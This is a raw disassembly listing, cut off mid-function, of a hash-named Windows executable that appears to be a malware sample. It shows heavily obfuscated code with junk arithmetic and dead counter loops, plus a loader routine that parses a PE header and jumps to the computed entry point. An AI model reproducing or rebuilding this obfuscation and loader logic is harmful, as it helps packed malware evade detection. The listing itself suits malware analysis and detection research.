
adf0fdbe8d374b4251f8e42e2164c66ad52a9e43b6c462fff0755c309819b9a8.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x14c
  401009:	push   ebx
  40100a:	add    DWORD PTR ds:0x413d18,edx
  401010:	push   esi
  401011:	adc    eax,DWORD PTR ds:0x41400c
  401017:	push   edi
  401018:	adc    DWORD PTR ds:0x413c74,ecx
  40101e:	xor    esi,esi
  401020:	sbb    eax,DWORD PTR ds:0x413bfe
  401026:	mov    DWORD PTR [ebp-0x10],esi
  401029:	adc    edi,eax
  40102b:	mov    eax,DWORD PTR [ebp-0x20]
  40102e:	and    DWORD PTR ds:0x413c06,0x0
  401038:	jmp    0x40104a
  40103d:	mov    edi,DWORD PTR ds:0x413c06
  401043:	inc    edi
  401044:	mov    DWORD PTR ds:0x413c06,edi
  40104a:	cmp    DWORD PTR ds:0x413c06,0x12
  401051:	jae    0x40107f
  401057:	cmp    DWORD PTR ds:0x413c06,0x18
  40105e:	jne    0x401074
  401064:	push   0x413c74
  401069:	push   0x1062
  40106e:	call   DWORD PTR ds:0x41675c
  401074:	jmp    0x40103d
  401079:	xor    DWORD PTR ds:0x413bf6,ebx
  40107f:	push   0x5
  401081:	mov    DWORD PTR [ebp-0x20],eax
  401084:	pop    edi
  401085:	push   0x4164c8
  40108a:	call   DWORD PTR ds:0x416794
  401090:	push   esi
  401091:	and    DWORD PTR ds:0x413c70,0x414018
  40109b:	push   0x69
  40109d:	push   0xe
  40109f:	push   0x6
  4010a1:	push   0x4
  4010a3:	xor    DWORD PTR ds:0x41401c,0x413c16
  4010ad:	push   0x87698897
  4010b2:	sbb    DWORD PTR ds:0x41401c,0x413c16
  4010bc:	call   DWORD PTR ds:0x416750
  4010c2:	push   esi
  4010c3:	add    DWORD PTR ds:0x413d2c,0x792b
  4010cd:	push   0x3
  4010cf:	push   0x2
  4010d1:	push   0x4
  4010d3:	sbb    DWORD PTR ds:0x414008,0x413c0e
  4010dd:	push   0x2
  4010df:	push   0x56778769
  4010e4:	push   0x76867576
  4010e9:	inc    DWORD PTR ds:0x413c74
  4010ef:	call   DWORD PTR ds:0x41674c
  4010f5:	add    DWORD PTR ds:0x413c6c,0x413d20
  4010ff:	dec    edi
  401100:	mov    DWORD PTR ds:0x413bf6,0x25f1
  40110a:	jne    0x401085
  401110:	push   0x4164f0
  401115:	sbb    DWORD PTR ds:0x414000,0x413c0e
  40111f:	push   esi
  401120:	push   esi
  401121:	and    DWORD PTR ds:0x413c78,0x5ead
  40112b:	call   DWORD PTR ds:0x416788
  401131:	test   eax,eax
  401133:	je     0x40114f
  401139:	mov    eax,ds:0x75687681
  40113e:	adc    ebx,DWORD PTR ds:0x413c0a
  401144:	imul   eax,eax,0x5463da1d
  40114a:	mov    ds:0x75687681,eax
  40114f:	mov    eax,DWORD PTR [ebp-0x20]
  401152:	mov    DWORD PTR ds:0x41401c,0x2026
  40115c:	mov    ebx,0xf89c85b0
  401161:	mov    DWORD PTR ds:0x413c78,0x6385
  40116b:	cmp    eax,ebx
  40116d:	jne    0x4011cf
  401173:	add    DWORD PTR ds:0x414004,0x37c8
  40117d:	mov    DWORD PTR ds:0x4164c4,0xf89c85b1
  401187:	push   DWORD PTR [ebp+0x10]
  40118a:	sub    DWORD PTR ds:0x413bfe,0x414004
  401194:	push   DWORD PTR [ebp+0xc]
  401197:	and    DWORD PTR ds:0x413c1a,0x413ce4
  4011a1:	push   DWORD PTR [ebp+0x8]
  4011a4:	xor    DWORD PTR ds:0x413d34,0x413d2c
  4011ae:	call   0x402685
  4011b3:	mov    ecx,DWORD PTR ds:0x4163b4
  4011b9:	mov    esi,DWORD PTR ds:0x413c1e
  4011bf:	or     DWORD PTR ds:0x413c06,esi
  4011c5:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4011cb:	xor    esi,esi
  4011cd:	mov    DWORD PTR [ecx],eax
  4011cf:	mov    DWORD PTR [ebp-0x8],ebx
  4011d2:	sub    ecx,DWORD PTR ds:0x413d20
  4011d8:	mov    DWORD PTR [ebp-0xc],0xf89c85b1
  4011df:	lea    eax,[ebp-0x60]
  4011e2:	xor    esi,DWORD PTR ds:0x413d18
  4011e8:	mov    DWORD PTR [ebp-0x48],eax
  4011eb:	lea    eax,[ebp-0x54]
  4011ee:	mov    DWORD PTR [ebp-0x1c],eax
  4011f1:	add    DWORD PTR ds:0x413c16,0x903
  4011fb:	mov    eax,ds:0x4163b4
  401200:	mov    eax,DWORD PTR [eax+0x1c8]
  401206:	adc    DWORD PTR ds:0x413cf4,edi
  40120c:	mov    eax,DWORD PTR [eax]
  40120e:	mov    esi,DWORD PTR ds:0x413ce4
  401214:	add    esi,DWORD PTR ds:0x413c16
  40121a:	mov    DWORD PTR ds:0x413ce4,esi
  401220:	mov    ecx,DWORD PTR [ebp-0x1c]
  401223:	xor    edi,edi
  401225:	mov    esi,0x7510894
  40122a:	xor    eax,esi
  40122c:	mov    edi,0x3272dc
  401231:	adc    DWORD PTR ds:0x413c78,0x59b2
  40123b:	add    eax,edi
  40123d:	mov    DWORD PTR ds:0x413d24,0x7b51
  401247:	mov    DWORD PTR [ecx],eax
  401249:	mov    eax,ds:0x4165e0
  40124e:	mov    DWORD PTR ds:0x413c80,0x7e03
  401258:	cmp    eax,0x312bc9f6
  40125d:	mov    DWORD PTR ds:0x413d24,0x296e
  401267:	jne    0x401312
  40126d:	mov    eax,DWORD PTR [ebp-0x8]
  401270:	mov    ecx,DWORD PTR ds:0x4163b4
  401276:	mov    ecx,DWORD PTR [ecx+0x198]
  40127c:	xor    eax,esi
  40127e:	add    eax,edi
  401280:	mov    edx,DWORD PTR ds:0x413c6c
  401286:	xor    DWORD PTR ds:0x414010,edx
  40128c:	mov    DWORD PTR [ecx],eax
  40128e:	movzx  ecx,BYTE PTR ds:0x413c6c
  401295:	and    ecx,DWORD PTR ds:0x413d2c
  40129b:	mov    DWORD PTR ds:0x413c6c,ecx
  4012a1:	mov    eax,DWORD PTR [ebp-0x8]
  4012a4:	mov    DWORD PTR ds:0x413cd8,0x1b
  4012ae:	cmp    DWORD PTR ds:0x413cd8,0x0
  4012b5:	je     0x401303
  4012bb:	cmp    DWORD PTR ds:0x413cd8,0x1c
  4012c2:	jne    0x4012dd
  4012c8:	push   0x104b
  4012cd:	push   0x413d18
  4012d2:	push   0x2575
  4012d7:	call   DWORD PTR ds:0x416760
  4012dd:	xor    edx,edx
  4012df:	xor    edx,DWORD PTR ds:0x413cd8
  4012e5:	dec    edx
  4012e6:	mov    DWORD PTR ds:0x413cd8,edx
  4012ec:	jmp    0x4012ae
  4012f1:	mov    edx,DWORD PTR ds:0x413ce8
  4012f7:	or     edx,DWORD PTR ds:0x413c7c
  4012fd:	mov    DWORD PTR ds:0x413ce8,edx
  401303:	xor    eax,esi
  401305:	add    eax,edi
  401307:	or     ecx,DWORD PTR ds:0x413d24
  40130d:	mov    ds:0x4165e0,eax
  401312:	mov    eax,ds:0x4163b4
  401317:	mov    eax,DWORD PTR [eax+0x18c]
  40131d:	and    DWORD PTR ds:0x413c1a,0x0
  401327:	jmp    0x401339
  40132c:	mov    ecx,DWORD PTR ds:0x413c1a
  401332:	inc    ecx
  401333:	mov    DWORD PTR ds:0x413c1a,ecx
  401339:	cmp    DWORD PTR ds:0x413c1a,0x15
  401340:	jae    0x40136e
  401346:	cmp    DWORD PTR ds:0x413c1a,0x20
  40134d:	jne    0x401369
  401353:	push   0x6f97
  401358:	push   DWORD PTR [ebp-0x18]
  40135b:	push   0x2919
  401360:	push   DWORD PTR [ebp-0x14]
  401363:	call   DWORD PTR ds:0x416764
  401369:	jmp    0x40132c
  40136e:	mov    eax,DWORD PTR [eax]
  401370:	xor    edx,edx
  401372:	or     edx,DWORD PTR ds:0x413c0e
  401378:	adc    DWORD PTR ds:0x413cdc,edx
  40137e:	mov    DWORD PTR [ebp-0xa4],eax
  401384:	xor    eax,eax
  401386:	xor    eax,DWORD PTR ds:0x413cd0
  40138c:	mov    eax,DWORD PTR [eax]
  40138e:	sbb    DWORD PTR ds:0x413d34,eax
  401394:	mov    eax,0xf89c85bc
  401399:	xor    edx,ecx
  40139b:	mov    DWORD PTR [ebp-0x10],eax
  40139e:	mov    DWORD PTR [ebp-0x10],eax
  4013a1:	mov    DWORD PTR [ebp-0x10],eax
  4013a4:	sub    ecx,ecx
  4013a6:	mov    DWORD PTR [ebp-0x1c],ebx
  4013a9:	or     DWORD PTR ds:0x413c80,0x7e3b
  4013b3:	mov    DWORD PTR [ebp-0x10],eax
  4013b6:	mov    DWORD PTR [ebp-0x10],0xf89c85b8
  4013bd:	add    DWORD PTR ds:0x413d34,edi
  4013c3:	mov    ecx,DWORD PTR [ebp-0x8]
  4013c6:	xor    ecx,esi
  4013c8:	add    ecx,edi
  4013ca:	mov    DWORD PTR [ebp-0x18],ecx
  4013cd:	add    DWORD PTR ds:0x414018,edi
  4013d3:	mov    ecx,DWORD PTR [ebp-0xc]
  4013d6:	and    DWORD PTR ds:0x413c7c,0xe1
  4013e0:	mov    edx,DWORD PTR [ebp-0xc]
  4013e3:	adc    DWORD PTR ds:0x413d28,0x413d20
  4013ed:	xor    edx,esi
  4013ef:	xor    ecx,esi
  4013f1:	sbb    DWORD PTR ds:0x414014,0x47d8
  4013fb:	add    ecx,edx
  4013fd:	movzx  edx,BYTE PTR ds:0x41400c
  401404:	and    DWORD PTR ds:0x413bf6,edx
  40140a:	mov    edx,DWORD PTR [ebp-0xc]
  40140d:	xor    edx,esi
  40140f:	lea    ecx,[ecx+edx*1+0x975894]
  401416:	cmp    DWORD PTR [ebp-0x18],ecx
  401419:	ja     0x4015f5
  40141f:	or     eax,DWORD PTR ds:0x413bfa
  401425:	mov    eax,DWORD PTR [ebp-0xc]
  401428:	mov    ecx,DWORD PTR ds:0x413c80
  40142e:	xor    DWORD PTR ds:0x413ce8,ecx
  401434:	mov    ecx,DWORD PTR [ebp-0x18]
  401437:	sbb    DWORD PTR ds:0x413d20,0x413d34
  401441:	xor    eax,esi
  401443:	and    DWORD PTR ds:0x413cdc,0x413d24
  40144d:	lea    eax,[eax+ecx*1+0x3272dc]
  401454:	sub    DWORD PTR ds:0x414008,0x413cd8
  40145e:	push   eax
  40145f:	sbb    DWORD PTR ds:0x413c0a,edi
  401465:	mov    eax,DWORD PTR [ebp-0x1c]
  401468:	xor    DWORD PTR ds:0x413c80,0x7b1e
  401472:	xor    eax,esi
  401474:	lea    eax,[ebp+eax*1+0x3272e4]
  40147b:	or     DWORD PTR ds:0x413c16,0x7d42
  401485:	push   eax
  401486:	mov    DWORD PTR ds:0x414018,0x19
  401490:	cmp    DWORD PTR ds:0x414018,0x0
  401497:	je     0x4014cb
  40149d:	cmp    DWORD PTR ds:0x414018,0x28
  4014a4:	jne    0x4014bb
  4014aa:	push   DWORD PTR [ebp-0x14]
  4014ad:	push   DWORD PTR [ebp-0x18]
  4014b0:	push   0x400000
  4014b5:	call   DWORD PTR ds:0x416768
  4014bb:	mov    eax,ds:0x414018
  4014c0:	dec    eax
  4014c1:	mov    ds:0x414018,eax
  4014c6:	jmp    0x401490
  4014cb:	mov    eax,ds:0x4163b4
  4014d0:	and    DWORD PTR ds:0x413c6c,0x2ac9
  4014da:	push   DWORD PTR [eax+0x1bc]
  4014e0:	call   0x40a25b
  4014e5:	mov    eax,DWORD PTR [ebp-0xc]
  4014e8:	sbb    edx,edx
  4014ea:	mov    ecx,DWORD PTR [ebp-0x18]
  4014ed:	and    DWORD PTR ds:0x413d24,0x0
  4014f7:	mov    edx,DWORD PTR ds:0x413d24
  4014fd:	inc    edx
  4014fe:	mov    DWORD PTR ds:0x413d24,edx
  401504:	cmp    DWORD PTR ds:0x413d24,0x1c
  40150b:	jne    0x401525
  401511:	push   DWORD PTR [ebp-0x14]
  401514:	push   0x413d30
  401519:	push   DWORD PTR [ebp-0x1c]
  40151c:	push   DWORD PTR [ebp-0x24]
  40151f:	call   DWORD PTR ds:0x416770
  401525:	cmp    DWORD PTR ds:0x413d24,0x1b
  40152c:	jb     0x4014f7
  401532:	xor    eax,esi
  401534:	lea    eax,[ecx+eax*1+0x3272dc]
  40153b:	mov    ecx,DWORD PTR [ebp-0xc]
  40153e:	mov    edx,DWORD PTR [ebp-0xc]
  401541:	dec    DWORD PTR ds:0x413bf6
  401547:	xor    edx,esi
  401549:	xor    ecx,esi
  40154b:	sbb    DWORD PTR ds:0x413c1e,0x34e4
  401555:	add    ecx,edx
  401557:	and    DWORD PTR ds:0x413c02,0x0
  401561:	jmp    0x401573
  401566:	mov    edx,DWORD PTR ds:0x413c02
  40156c:	inc    edx
  40156d:	mov    DWORD PTR ds:0x413c02,edx
  401573:	cmp    DWORD PTR ds:0x413c02,0x1b
  40157a:	jae    0x4015bf
  401580:	cmp    DWORD PTR ds:0x413c02,0x1e
  401587:	jne    0x4015a7
  40158d:	push   0x413d28
  401592:	push   0x3ad3
  401597:	push   0x416152
  40159c:	push   0x416152
  4015a1:	call   DWORD PTR ds:0x416774
  4015a7:	jmp    0x401566
  4015ac:	movzx  edx,BYTE PTR ds:0x413ce8
  4015b3:	sub    edx,DWORD PTR ds:0x413c1a
  4015b9:	mov    DWORD PTR ds:0x413ce8,edx
  4015bf:	mov    edx,DWORD PTR [ebp-0xc]
  4015c2:	xor    DWORD PTR ds:0x413c80,0x413c74
  4015cc:	xor    edx,esi
  4015ce:	lea    ecx,[ecx+edx*1+0x975894]
  4015d5:	mov    DWORD PTR [ebp-0x18],eax
  4015d8:	cmp    eax,ecx
  4015da:	mov    DWORD PTR ds:0x413c7c,0x908
  4015e4:	jbe    0x40141f
  4015ea:	add    DWORD PTR ds:0x413cf4,ecx
  4015f0:	mov    eax,0xf89c85bc
  4015f5:	add    DWORD PTR ds:0x414014,ecx
  4015fb:	mov    ecx,DWORD PTR [ebp+0xc]
  4015fe:	mov    DWORD PTR ds:0x416238,ecx
  401604:	mov    ecx,DWORD PTR [ebp+0x10]
  401607:	and    DWORD PTR ds:0x413c1a,0x0
  401611:	mov    edx,DWORD PTR ds:0x413c1a
  401617:	inc    edx
  401618:	mov    DWORD PTR ds:0x413c1a,edx
  40161e:	cmp    DWORD PTR ds:0x413c1a,0x25
  401625:	jne    0x40163e
  40162b:	push   DWORD PTR [ebp-0x1c]
  40162e:	push   0x414004
  401633:	push   0x416170
  401638:	call   DWORD PTR ds:0x416778
  40163e:	cmp    DWORD PTR ds:0x413c1a,0x19
  401645:	jb     0x401611
  40164b:	mov    DWORD PTR ds:0x41648c,ecx
  401651:	adc    DWORD PTR ds:0x413c1e,ebx
  401657:	mov    ecx,DWORD PTR ds:0x416238
  40165d:	mov    edx,DWORD PTR ds:0x414014
  401663:	xor    DWORD PTR ds:0x413c0e,edx
  401669:	mov    edx,DWORD PTR [ebp-0x48]
  40166c:	sub    ecx,edi
  40166e:	and    DWORD PTR ds:0x413cf0,0x24ff
  401678:	xor    ecx,esi
  40167a:	mov    DWORD PTR [edx],ecx
  40167c:	not    ecx
  40167e:	mov    ecx,DWORD PTR [ebp-0x20]
  401681:	mov    DWORD PTR ds:0x413c16,0x6aa9
  40168b:	cmp    ecx,ebx
  40168d:	mov    DWORD PTR ds:0x413c70,0x4e28
  401697:	jne    0x401b90
  40169d:	add    DWORD PTR ds:0x413d18,0x41400c
  4016a7:	lea    eax,[ebp-0x5c]
  4016aa:	and    DWORD PTR ds:0x413c16,0x3f2d
  4016b4:	mov    DWORD PTR [ebp-0xb0],eax
  4016ba:	lea    eax,[ebp+0x4]
  4016bd:	add    DWORD PTR ds:0x413cec,0x413d24
  4016c7:	mov    DWORD PTR [ebp-0x5c],eax
  4016ca:	mov    eax,DWORD PTR [ebp-0x5c]
  4016cd:	xor    DWORD PTR ds:0x413ce4,0x37e4
  4016d7:	test   eax,eax
  4016d9:	mov    DWORD PTR ds:0x413c7c,0x3884
  4016e3:	je     0x402663
  4016e9:	adc    DWORD PTR ds:0x413c12,ebx
  4016ef:	mov    eax,DWORD PTR [ebp-0x24]
  4016f2:	mov    eax,DWORD PTR [ebp-0xc]
  4016f5:	mov    eax,DWORD PTR [ebp-0x8]
  4016f8:	sub    ecx,0x1090
  4016fe:	mov    DWORD PTR [ebp+0xc],eax
  401701:	mov    eax,eax
  401703:	mov    eax,ds:0x4163b4
  401708:	and    DWORD PTR ds:0x413bfa,0x0
  401712:	jmp    0x401724
  401717:	mov    ecx,DWORD PTR ds:0x413bfa
  40171d:	inc    ecx
  40171e:	mov    DWORD PTR ds:0x413bfa,ecx
  401724:	cmp    DWORD PTR ds:0x413bfa,0x11
  40172b:	jae    0x401754
  401731:	cmp    DWORD PTR ds:0x413bfa,0x20
  401738:	jne    0x401749
  40173e:	push   0x4160de
  401743:	call   DWORD PTR ds:0x41677c
  401749:	jmp    0x401717
  40174e:	and    DWORD PTR ds:0x413c74,ecx
  401754:	mov    eax,DWORD PTR [eax+0x1c8]
  40175a:	and    DWORD PTR ds:0x414010,0x0
  401764:	mov    ecx,DWORD PTR ds:0x414010
  40176a:	inc    ecx
  40176b:	mov    DWORD PTR ds:0x414010,ecx
  401771:	cmp    DWORD PTR ds:0x414010,0xf
  401778:	jne    0x401791
  40177e:	push   0x413c0a
  401783:	push   DWORD PTR [ebp-0x20]
  401786:	push   0x4160b3
  40178b:	call   DWORD PTR ds:0x416780
  401791:	cmp    DWORD PTR ds:0x414010,0xe
  401798:	jne    0x4017ab
  40179e:	mov    ecx,DWORD PTR ds:0x414010
  4017a4:	inc    ecx
  4017a5:	mov    DWORD PTR ds:0x414010,ecx
  4017ab:	cmp    DWORD PTR ds:0x414010,0x1c
  4017b2:	jb     0x401764
  4017b8:	mov    DWORD PTR ds:0x413bf6,0x13
  4017c2:	cmp    DWORD PTR ds:0x413bf6,0x0
  4017c9:	je     0x401820
  4017cf:	cmp    DWORD PTR ds:0x413bf6,0x6
  4017d6:	jne    0x4017ec
  4017dc:	push   0x414018
  4017e1:	push   0x1023
  4017e6:	call   DWORD PTR ds:0x416784
  4017ec:	cmp    DWORD PTR ds:0x413bf6,0x7
  4017f3:	jne    0x401808
  4017f9:	xor    ecx,ecx
  4017fb:	add    ecx,DWORD PTR ds:0x413bf6
  401801:	dec    ecx
  401802:	mov    DWORD PTR ds:0x413bf6,ecx
  401808:	mov    ecx,DWORD PTR ds:0x413bf6
  40180e:	dec    ecx
  40180f:	mov    DWORD PTR ds:0x413bf6,ecx
  401815:	jmp    0x4017c2
  40181a:	adc    DWORD PTR ds:0x413ce8,ebx
  401820:	mov    eax,DWORD PTR [eax]
  401822:	and    DWORD PTR ds:0x414010,0x0
  40182c:	jmp    0x401840
  401831:	xor    ecx,ecx
  401833:	add    ecx,DWORD PTR ds:0x414010
  401839:	inc    ecx
  40183a:	mov    DWORD PTR ds:0x414010,ecx
  401840:	cmp    DWORD PTR ds:0x414010,0x19
  401847:	jae    0x401873
  40184d:	cmp    DWORD PTR ds:0x414010,0x27
  401854:	jne    0x401868
  40185a:	push   DWORD PTR [ebp-0x18]
  40185d:	push   0x4160de
  401862:	call   DWORD PTR ds:0x41678c
  401868:	jmp    0x401831
  40186d:	sub    DWORD PTR ds:0x413c0a,edi
  401873:	cdq    
  401874:	mov    ebx,eax
  401876:	mov    eax,0xfabdbeef
  40187b:	mov    ecx,DWORD PTR ds:0x413c1e
  401881:	or     DWORD PTR ds:0x413d1c,ecx
  401887:	add    ebx,eax
  401889:	mov    ecx,0x6f0c
  40188e:	adc    edx,0xffffffff
  401891:	and    DWORD PTR [ebp-0x10],0x0
  401895:	sub    DWORD PTR ds:0x413c6c,0x6250
  40189f:	xor    edx,0x0
  4018a2:	xor    DWORD PTR ds:0x413c84,ecx
  4018a8:	mov    DWORD PTR [ebp-0x80],edx
  4018ab:	mov    edx,DWORD PTR [ebp+0xc]
  4018ae:	mov    DWORD PTR ds:0x413c74,0x12
  4018b8:	cmp    DWORD PTR ds:0x413c74,0x0
  4018bf:	je     0x401906
  4018c5:	cmp    DWORD PTR ds:0x413c74,0x1e
  4018cc:	jne    0x4018f2
  4018d2:	push   DWORD PTR [ebp-0x24]
  4018d5:	push   0x413cd8
  4018da:	push   0x560c
  4018df:	push   0x416049
  4018e4:	push   DWORD PTR [ebp-0x18]
  4018e7:	push   0x1b95
  4018ec:	call   DWORD PTR ds:0x416790
  4018f2:	mov    ecx,DWORD PTR ds:0x413c74
  4018f8:	dec    ecx
  4018f9:	mov    DWORD PTR ds:0x413c74,ecx
  4018ff:	jmp    0x4018b8
  401904:	not    ecx
  401906:	mov    DWORD PTR [ebp-0x14],edx
  401909:	and    DWORD PTR ds:0x413c06,0x0
  401913:	jmp    0x401925
  401918:	mov    edx,DWORD PTR ds:0x413c06
  40191e:	inc    edx
  40191f:	mov    DWORD PTR ds:0x413c06,edx
  401925:	cmp    DWORD PTR ds:0x413c06,0x14
  40192c:	jae    0x401967
  401932:	cmp    DWORD PTR ds:0x413c06,0x5
  401939:	jne    0x401948
  40193f:	push   DWORD PTR [ebp-0xc]
  401942:	call   DWORD PTR ds:0x416798
  401948:	cmp    DWORD PTR ds:0x413c06,0x4
  40194f:	jne    0x401962
  401955:	mov    edx,DWORD PTR ds:0x413c06
  40195b:	inc    edx
  40195c:	mov    DWORD PTR ds:0x413c06,edx
  401962:	jmp    0x401918
  401967:	mov    ecx,0x8a29a125
  40196c:	xor    ebx,ecx
  40196e:	neg    DWORD PTR ds:0x413d18
  401974:	add    DWORD PTR [ebp-0x14],eax
  401977:	mov    DWORD PTR ds:0x414010,ebx
  40197d:	mov    edx,DWORD PTR [ebp-0x14]
  401980:	mov    DWORD PTR ds:0x41401c,0x7ba5
  40198a:	adc    DWORD PTR [ebp-0x10],0xffffffff
  40198e:	xor    edx,ecx
  401990:	add    DWORD PTR ds:0x414010,0x307
  40199a:	mov    DWORD PTR [ebp-0x78],edx
  40199d:	mov    edx,DWORD PTR [ebp-0x10]
  4019a0:	xor    edx,0x0
  4019a3:	mov    DWORD PTR ds:0x414018,0x4b60
  4019ad:	mov    DWORD PTR [ebp-0x74],edx
  4019b0:	cmp    DWORD PTR [ebp-0x78],ebx
  4019b3:	mov    DWORD PTR ds:0x413c02,0x936
  4019bd:	jne    0x4019df
  4019c3:	mov    DWORD PTR ds:0x413c0a,edx
  4019c9:	mov    edx,DWORD PTR [ebp-0x80]
  4019cc:	cmp    DWORD PTR [ebp-0x74],edx
  4019cf:	mov    DWORD PTR ds:0x413c7c,0x301a
  4019d9:	je     0x401aa0
  4019df:	and    DWORD PTR ds:0x413d34,0x0
  4019e9:	jmp    0x4019fb
  4019ee:	mov    edx,DWORD PTR ds:0x413d34
  4019f4:	inc    edx
  4019f5:	mov    DWORD PTR ds:0x413d34,edx
  4019fb:	cmp    DWORD PTR ds:0x413d34,0x16
  401a02:	jae    0x401a25
  401a08:	cmp    DWORD PTR ds:0x413d34,0x26
  401a0f:	jne    0x401a20
  401a15:	push   0x414014
  401a1a:	call   DWORD PTR ds:0x41679c
  401a20:	jmp    0x4019ee
  401a25:	mov    edx,DWORD PTR ds:0x4163b4
  401a2b:	neg    DWORD PTR ds:0x414008
  401a31:	mov    edx,DWORD PTR [edx+0x1c0]
  401a37:	mov    DWORD PTR ds:0x413bf6,0x5ff4
  401a41:	mov    edx,DWORD PTR [edx]
  401a43:	and    DWORD PTR ds:0x413ce0,0x41400c
  401a4d:	xor    ebx,ebx
  401a4f:	add    edx,eax
  401a51:	mov    DWORD PTR ds:0x413c78,0x3f53
  401a5b:	adc    ebx,0xffffffff
  401a5e:	and    DWORD PTR ds:0x413c02,0x1b79
  401a68:	xor    edx,ecx
  401a6a:	add    DWORD PTR ds:0x413ce0,0x413c6c
  401a74:	xor    ebx,0x0
  401a77:	mov    DWORD PTR ds:0x413bfa,0x4fab
  401a81:	cmp    edx,0x70941fd5
  401a87:	mov    DWORD PTR ds:0x413d2c,0x7f9c
  401a91:	jne    0x402663
  401a97:	cmp    ebx,0xffffffff
  401a9a:	jne    0x402663
  401aa0:	mov    edx,DWORD PTR ds:0x416430
  401aa6:	add    DWORD PTR ds:0x413cdc,0x3946
  401ab0:	mov    ebx,DWORD PTR ds:0x416438
  401ab6:	and    DWORD PTR ds:0x413c80,0x3ee6
  401ac0:	xor    edx,ebx
  401ac2:	mov    DWORD PTR ds:0x414000,0x16
  401acc:	cmp    DWORD PTR ds:0x414000,0x0
  401ad3:	je     0x401b12
  401ad9:	cmp    DWORD PTR ds:0x414000,0x26
  401ae0:	jne    0x401af6
  401ae6:	push   0x413c84
  401aeb:	push   0x56a1
  401af0:	call   DWORD PTR ds:0x41675c
  401af6:	mov    ebx,DWORD PTR ds:0x414000
  401afc:	dec    ebx
  401afd:	mov    DWORD PTR ds:0x414000,ebx
  401b03:	jmp    0x401acc
  401b08:	add    DWORD PTR ds:0x413c84,0x1062
  401b12:	mov    DWORD PTR ds:0x416430,edx
  401b18:	mov    ebx,DWORD PTR ds:0x416430
  401b1e:	and    DWORD PTR ds:0x413d20,0x0
  401b28:	jmp    0x401b3a
  401b2d:	mov    edx,DWORD PTR ds:0x413d20
  401b33:	inc    edx
  401b34:	mov    DWORD PTR ds:0x413d20,edx
  401b3a:	cmp    DWORD PTR ds:0x413d20,0x1a
  401b41:	jae    0x401b72
  401b47:	cmp    DWORD PTR ds:0x413d20,0x25
  401b4e:	jne    0x401b67
  401b54:	push   DWORD PTR [ebp-0x24]
  401b57:	push   0x413d1c
  401b5c:	push   0x7dc0
  401b61:	call   DWORD PTR ds:0x416760
  401b67:	jmp    0x401b2d
  401b6c:	adc    DWORD PTR ds:0x413bfe,edi
  401b72:	mov    edx,DWORD PTR [ebp-0x5c]
  401b75:	xor    DWORD PTR ds:0x413c7c,0x413c1e
  401b7f:	add    DWORD PTR [edx],ebx
  401b81:	mov    DWORD PTR ds:0x414010,0x3837
  401b8b:	jmp    0x402624
  401b90:	mov    DWORD PTR ds:0x41401c,0x671d
  401b9a:	mov    ecx,DWORD PTR [ebp-0x60]
  401b9d:	mov    DWORD PTR ds:0x413c02,0x3bc3
  401ba7:	cmp    ecx,0xf89c85b1
  401bad:	je     0x401d26
  401bb3:	mov    ecx,DWORD PTR [ebp-0x8]
  401bb6:	mov    edx,DWORD PTR [ebp-0x54]
  401bb9:	or     DWORD PTR ds:0x413c1a,0x413cdc
  401bc3:	xor    ecx,esi
  401bc5:	add    ecx,edi
  401bc7:	cmp    ecx,edx
  401bc9:	je     0x401d26
  401bcf:	mov    DWORD PTR ds:0x413d28,0x18
  401bd9:	cmp    DWORD PTR ds:0x413d28,0x0
  401be0:	je     0x401c32
  401be6:	cmp    DWORD PTR ds:0x413d28,0xa
  401bed:	jne    0x401c07
  401bf3:	push   0x7420
  401bf8:	push   DWORD PTR [ebp-0xc]
  401bfb:	push   DWORD PTR [ebp-0x20]
  401bfe:	push   DWORD PTR [ebp-0x14]
  401c01:	call   DWORD PTR ds:0x416764
  401c07:	cmp    DWORD PTR ds:0x413d28,0xb
  401c0e:	jne    0x401c1f
  401c14:	mov    eax,ds:0x413d28
  401c19:	dec    eax
  401c1a:	mov    ds:0x413d28,eax
  401c1f:	xor    eax,eax
  401c21:	add    eax,DWORD PTR ds:0x413d28
  401c27:	dec    eax
  401c28:	mov    ds:0x413d28,eax
  401c2d:	jmp    0x401bd9
  401c32:	mov    eax,ds:0x4163b4
  401c37:	mov    DWORD PTR ds:0x413c88,0x7ef
  401c41:	mov    eax,DWORD PTR [eax+0x194]
  401c47:	mov    ecx,DWORD PTR [eax]
  401c49:	mov    eax,DWORD PTR [ecx+0x3c]
  401c4c:	adc    DWORD PTR ds:0x413c74,0x414014
  401c56:	push   DWORD PTR ds:0x41648c
  401c5c:	add    DWORD PTR ds:0x413c1e,0x413d24
  401c66:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401c6a:	push   DWORD PTR ds:0x416238
  401c70:	add    DWORD PTR ds:0x414000,0x414014
  401c7a:	add    eax,ecx
  401c7c:	mov    DWORD PTR ds:0x413d1c,0x15
  401c86:	cmp    DWORD PTR ds:0x413d1c,0x0
  401c8d:	je     0x401ce5
  401c93:	cmp    DWORD PTR ds:0x413d1c,0x3
  401c9a:	jne    0x401cb1
  401ca0:	push   0x8408
  401ca5:	push   DWORD PTR [ebp-0x24]
  401ca8:	push   DWORD PTR [ebp-0x1c]
  401cab:	call   DWORD PTR ds:0x416768
  401cb1:	cmp    DWORD PTR ds:0x413d1c,0x4
  401cb8:	jne    0x401ccb
  401cbe:	mov    ecx,DWORD PTR ds:0x413d1c
  401cc4:	dec    ecx
  401cc5:	mov    DWORD PTR ds:0x413d1c,ecx
  401ccb:	xor    ecx,ecx
  401ccd:	or     ecx,DWORD PTR ds:0x413d1c
  401cd3:	dec    ecx
  401cd4:	mov    DWORD PTR ds:0x413d1c,ecx
  401cda:	jmp    0x401c86
  401cdf:	add    DWORD PTR ds:0x413bfa,ecx
  401ce5:	mov    ecx,DWORD PTR ds:0x4163b4
  401ceb:	mov    ecx,DWORD PTR [ecx+0x194]
  401cf1:	or     DWORD PTR ds:0x414000,0x5329
  401cfb:	push   DWORD PTR [ecx]
  401cfd:	call   eax
  401cff:	mov    ecx,DWORD PTR ds:0x4163b4
  401d05:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d0b:	mov    DWORD PTR ds:0x413c78,0x5666
  401d15:	mov    DWORD PTR [ecx],eax
  401d17:	mov    DWORD PTR ds:0x413d24,0x5c21
  401d21:	jmp    0x402663
  401d26:	adc    edx,DWORD PTR ds:0x413cf0
  401d2c:	mov    ecx,DWORD PTR [ebp-0x8]
  401d2f:	sub    edx,DWORD PTR ds:0x413c70
  401d35:	mov    edx,DWORD PTR [ebp-0xa4]
